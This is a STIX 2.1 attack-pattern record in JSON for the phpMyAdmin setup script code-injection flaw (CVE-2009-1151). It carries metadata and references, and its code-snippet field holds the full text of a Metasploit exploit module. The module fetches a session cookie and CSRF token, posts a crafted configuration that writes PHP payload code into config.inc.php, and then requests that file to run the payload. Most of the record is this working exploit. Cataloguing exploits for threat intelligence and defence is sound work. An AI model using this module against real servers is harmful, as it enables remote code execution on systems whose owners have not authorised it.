{
    "type": "attack-pattern",
    "spec_version": "2.1",
    "id": "attack-pattern--6e7bd45a-1c6c-40f2-a35d-f122186ba0d4",
    "created": "2024-08-14T17:12:27.731193Z",
    "modified": "2024-08-14T17:12:27.731197Z",
    "name": "PhpMyAdmin Config File Code Injection",
    "description": " This module exploits a vulnerability in phpMyAdmin's setup feature which allows an attacker to inject arbitrary PHP code into a configuration file. The original advisory says the vulnerability is present in phpMyAdmin versions 2.11.x < 2.11.9.5 and 3.x < 3.1.3.1; this module was tested on 3.0.1.1.  The file where our payload is written (phpMyAdmin/config/config.inc.php) is not directly used by the system, so it may be a good idea to either delete it or copy the running config (phpMyAdmin/config.inc.php) over it after successful exploitation. ",
    "external_references": [
        {
            "source_name": "metasploit",
            "url": "https://github.com/rapid7/metasploit-framework/blob/master/exploits/unix/webapp/phpmyadmin_config.rb",
            "external_id": "phpmyadmin_config.rb"
        },
        {
            "source_name": "CVE",
            "external_id": "2009-1151"
        },
        {
            "source_name": "reference",
            "url": "http://www.phpmyadmin.net/home_page/security/PMASA-2009-3.php"
        },
        {
            "source_name": "reference",
            "url": "http://labs.neohapsis.com/2009/04/06/about-cve-2009-1151/"
        }
    ],
    "x_code_snippet": "##\n# This module requires Metasploit: https://metasploit.com/download\n# Current source: https://github.com/rapid7/metasploit-framework\n##\n\nclass MetasploitModule < Msf::Exploit::Remote\n  Rank = ExcellentRanking\n\n  include Msf::Exploit::Remote::HttpClient\n\n  def initialize(info = {})\n    super(update_info(info,\n      'Name'           => 'PhpMyAdmin Config File Code Injection',\n      'Description'    => %q{\n          This module exploits a vulnerability in phpMyAdmin's setup\n        feature which allows an attacker to inject arbitrary PHP\n        code into a configuration file. The original advisory says\n        the vulnerability is present in phpMyAdmin versions 2.11.x\n        < 2.11.9.5 and 3.x < 3.1.3.1; this module was tested on\n        3.0.1.1.\n\n        The file where our payload is written\n        (phpMyAdmin/config/config.inc.php) is not directly used by\n        the system, so it may be a good idea to either delete it or\n        copy the running config (phpMyAdmin/config.inc.php) over it\n        after successful exploitation.\n      },\n      'Author'         =>\n        [\n          'Greg Ose', # Discovery\n          'pagvac',   # milw0rm PoC\n          'egypt'     # metasploit module\n        ],\n      'License'        => MSF_LICENSE,\n      'References'     =>\n        [\n          [ 'CVE', '2009-1151' ],\n          [ 'OSVDB', '53076' ],\n          [ 'EDB', '8921' ],\n          [ 'URL', 'http://www.phpmyadmin.net/home_page/security/PMASA-2009-3.php' ],\n          [ 'URL', 'http://labs.neohapsis.com/2009/04/06/about-cve-2009-1151/' ]\n        ],\n      'Privileged'     => false,\n      'Platform'       => ['php'],\n      'Arch'           => ARCH_PHP,\n      'Payload'        =>\n        {\n          'Space'       => 4000, # unlimited really since our shellcode gets written to a file\n          'DisableNops' => true,\n          # No filtering whatsoever, so no badchars\n          'Compat'      =>\n            {\n              'ConnectionType' => 'find',\n            },\n          'Keys'        => ['php'],\n        },\n      'Targets'        =>\n        [\n          [ 'Automatic (phpMyAdmin 2.11.x < 2.11.9.5 and 3.x < 3.1.3.1)', { } ],\n        ],\n      'DefaultTarget'  => 0,\n      'DisclosureDate' => '2009-03-24'))\n\n    register_options(\n      [\n        OptString.new('URI',   [ true,  \"Base phpMyAdmin directory path\", '/phpMyAdmin/']),\n      ])\n  end\n\n  def exploit\n    # First, grab the session cookie and the CSRF token\n    print_status(\"Grabbing session cookie and CSRF token\")\n    uri = normalize_uri(datastore['URI'], \"/scripts/setup.php\")\n    response = send_request_raw({ 'uri' => uri})\n    if !response\n      fail_with(Failure::NotFound, \"Failed to retrieve hash, server may not be vulnerable.\")\n      return\n    end\n    if (response.body !~ /\"token\"\\s*value=\"([^\"]*)\"/)\n      fail_with(Failure::NotFound, \"Couldn't find token and can't continue without it. Is URI set correctly?\")\n      return\n    end\n    token = $1\n    cookie = response.get_cookies\n\n    # There is probably a great deal of randomization that can be done with\n    # this format.\n    config = \"a:1:{s:7:\\\"Servers\\\";a:1:{i:0;a:6:{s:#{payload.encoded.length + 13}:\\\"\"\n    config << \"host']='';\" + payload.encoded + \";//\"\n    config << '\";s:9:\"' + rand_text_alpha(9) + '\";s:9:\"extension\";s:6:\"mysqli\";s:12:\"connect_type\"'\n    config << ';s:3:\"tcp\";s:8:\"compress\";b:0;s:9:\"auth_type\";s:6:\"config\";s:4:\"user\";s:4:\"' + rand_text_alpha(4) + '\";}}}'\n\n    data = \"token=#{token}&action=save&configuration=\"\n    data << Rex::Text.uri_encode(config)\n    data << \"&eoltype=unix\"\n\n    # Now that we've got the cookie and token, send the evil\n    print_status(\"Sending save request\")\n    response = send_request_raw({\n      'uri'\t  => normalize_uri(datastore['URI'], \"/scripts/setup.php\"),\n      'method'  => 'POST',\n      'data'    => data,\n      'cookie'  => cookie,\n      'headers' =>\n      {\n        'Content-Type'\t => 'application/x-www-form-urlencoded',\n        'Content-Length' => data.length\n      }\n    }, 3)\n\n    print_status(\"Requesting our payload\")\n\n    # very short timeout because the request may never return if we're\n    # sending a socket payload\n    timeout = 0.1\n    response = send_request_raw({\n      # Allow findsock payloads to work\n      'global' => true,\n      'uri' => normalize_uri(datastore['URI'], \"/config/config.inc.php\")\n    }, timeout)\n\n    handler\n  end\nend\n",
    "x_mitre_disclosure_date": "2009-03-24",
    "x_mitre_platforms": [
        "['php']"
    ]
}